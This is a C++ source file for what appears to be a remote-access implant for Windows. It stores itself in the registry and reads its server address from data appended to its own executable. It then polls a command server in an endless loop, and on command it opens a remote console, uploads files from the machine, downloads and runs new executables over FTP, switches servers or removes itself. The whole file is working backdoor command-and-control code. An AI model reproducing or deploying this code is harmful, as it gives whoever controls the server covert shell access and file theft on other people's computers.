#include "stdafx.h"
#include <iostream>
#include "RegistryHelper.h"
#include "FtpHelper.h"
#include "ConsoleHelper.h"
#include "UpdateHelper.h"
#include <string>
#include "main.h"
#include "HttpClient.h"
#include <Shlwapi.h>

using namespace utility;                    // Common utilities like string conversions
using namespace web;                        // Common features like URIs.
using namespace web::http;                  // Common HTTP functionality
using namespace web::http::client;          // HTTP client features
using namespace concurrency::streams;       // Asynchronous streams
//using namespace web::http::experimental::listener;          // HTTP server
//using namespace web::experimental::web_sockets::client;     // WebSockets client
using namespace web::json;                                  // JSON library

using namespace std;

int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
	_In_opt_ HINSTANCE hPrevInstance,
	_In_ LPWSTR    lpCmdLine,
	_In_ int       nCmdShow)
{
	try {
		
		RegistryHelper::RegisterProgram();

		wchar_t pathToExe[MAX_PATH];
		GetModuleFileNameW(NULL, pathToExe, MAX_PATH);
		PathRemoveFileSpec(pathToExe);
		SetCurrentDirectory(pathToExe);
		//ShowWindow(GetConsoleWindow(), SW_HIDE);
		//check registry
		//read config
		//connect to server
		//wait for commands

		/*CREATE_COMMAND_DISPATHCER()

		IF_OPTION("/unistall")
			DO_COMMAND(Uninstall)

		IF_OPTION("/install")
			INSTALL(Install)

		IF_OPTION("/restart")
			INSTALL(Restart)



		IF_OPTION("/restart")
		IF_OPTION("/restart")
		IF_OPTION("/restart")
		IF_OPTION("/restart")
	*/

		auto host = RegistryHelper::GetValue(string_t(L"Host"));
		auto proxy = RegistryHelper::GetValue(string_t(L"Proxy"));
		
		if (host.empty())
		{			
			ifstream selfFile;

			std::wstring fileName(MAX_PATH, L'\0');
			GetModuleFileName(NULL, &fileName[0], MAX_PATH);
			selfFile.open(fileName.c_str());

			INT16 state = 0;
			selfFile.seekg(-(signed)(sizeof(INT16)), ios::end);
			selfFile.read(reinterpret_cast<char *>(&state), sizeof(INT16));

			if (state == 42)
			{
				selfFile.seekg(-(signed)((signed)sizeof(INT16) + sizeof(INT16)), ios::end);
				selfFile.read(reinterpret_cast<char *>(&state), sizeof(INT16));
				// now state contains length of string containing [user:pas@proxyserveraddress|]serveraddress

				selfFile.seekg(-(signed)(sizeof(INT16) + sizeof(INT16) + state), ios::end);
				string_t configString(state/sizeof(wchar_t) + 1, '\0');
				selfFile.read(reinterpret_cast<char *>(&configString[0]), state);
				
				std::error_code ifError;
				auto parsedValue = json::value::parse(configString, ifError);
				auto settings = parsedValue.as_object();
				//if(obj[L"ServerIpAndPort"])
				
				host = string_t(L"http://") + settings[L"ServerIpAndPort"].as_string() + string_t(L"/api/Commands");

				if (!settings[L"ProxyIp"].is_null())
				{
					proxy = settings[L"ProxyIp"].as_string();
				}
			}
			else
			{
				host = string_t(L"http://localhost:5000/api/Commands");
			}
			selfFile.close();
			RegistryHelper::SetValue(string_t(L"Host"), host);
			host = RegistryHelper::GetValue(string_t(L"Host"));
			RegistryHelper::SetValue(string_t(L"Proxy"), proxy);
		}

		auto id = RegistryHelper::GetValue(string_t(L"Id"));

		http_client_config config;
		if (!proxy.empty())
			config.set_proxy(web_proxy(proxy.c_str()));

		http_client client(host.c_str(), config);
		ConsoleHelper pipes(&client);
		if (id.empty())
		{
			bool success = false;
			while(!success)
			try {
				id = client.request(methods::GET).then([](http_response response) -> pplx::task<json::value>
				{
					if (response.status_code() == status_codes::OK)
					{
						return response.extract_json();
					}

					// Handle error cases, for now return empty json value... 
					return pplx::task_from_result(json::value());
				}).get()[L"Id"].as_string();
				success = true;
			}
			catch(...)
			{
				Sleep(5000);
			}
			RegistryHelper::SetValue(string_t(L"Id"), id);
		}
		string_t ver = RegistryHelper::GetOsVersion();
		for (;;)
		{
			try {
				http_request request(methods::GET);
				request.headers().add(L"OS", ver);
				request.set_request_uri(id);
				auto commandRes = client.request(request).then([](http_response response) -> pplx::task<json::value>
				{
					if (response.status_code() == status_codes::OK)
					{
						return response.extract_json();
					}

					// Handle error cases, for now return empty json value... 
					return pplx::task_from_result(json::value());
				}).get();
				auto command = commandRes[L"Command"].as_string();
				//wcout << command.c_str() << endl;
				if (command == L"Console")
				{
					pipes.Start();
				}

				if (command == L"ConsoleExit")
				{
					pipes.Exit();
				}

				if (command == L"ConsoleEnter")
				{
					pipes.Enter(commandRes[L"Value"].as_string());
				}

				if (command == L"Update")
				{
					auto newExeFtp = commandRes[L"Address"].as_string();
					string_t szPathToExe(MAX_PATH, L'\0');
					GetModuleFileName(NULL, (LPWSTR)szPathToExe.c_str(), MAX_PATH);
					szPathToExe.resize(0, szPathToExe.find_first_of(L'\0'));
					auto filepart = string_t(PathFindFileName(newExeFtp.c_str()));
					//PathRemoveExtension(filepart);

					FtpHelper::GetFile(newExeFtp, filepart+L".tmp");
					UpdateHelper::RemoveAndStart(szPathToExe, filepart + L".tmp", filepart);
				}

				if (command == L"Uninstall")
				{
					wchar_t szPathToExe[MAX_PATH];
					GetModuleFileNameW(NULL, szPathToExe, MAX_PATH);
					UpdateHelper::Remove(szPathToExe);	
					RegistryHelper::Clean();
					return 0;
				}

				if (command == L"Migrate")
				{
					RegistryHelper::SetValue(string_t(L"Host"), L"http://" + commandRes[L"Address"].as_string() + L"/api/Commands");

					wchar_t szPathToExe[MAX_PATH];
					GetModuleFileNameW(NULL, szPathToExe, MAX_PATH);
					UpdateHelper::Restart(szPathToExe);
				}

				if (command == L"Restart")
				{					
					wchar_t szPathToExe[MAX_PATH];
					GetModuleFileNameW(NULL, szPathToExe, MAX_PATH);
					UpdateHelper::Restart(szPathToExe);
				}

				if (command == L"GetFileFromClient")
				{
					auto address = commandRes[L"Address"].as_string();
					auto clientPath = commandRes[L"ClientPath"].as_string();
					FtpHelper::UploadFile(address, clientPath);
				}

				if (command == L"PutFileToClient")
				{
					auto address = commandRes[L"Address"].as_string();
					auto clientPath = commandRes[L"ClientPath"].as_string();
					FtpHelper::GetFile(address, clientPath);
				}
			}
			catch (...)
			{
				continue;
			}
		}
		//	.then([](pplx::task<json::value> previousTask)
		//{
		//	try
		//	{
		//		const json::value& v = previousTask.get();
		//		// Perform actions here to process the JSON value...
		//	}
		//	catch (const http_exception& e)
		//	{
		//		// Print error.
		//		cout << e.what() << endl;
		//	}
		//}).wait();
		//wcout << result.serialize() << endl;
	}
	catch(...)
	{

	}
	return 0;
}
//]
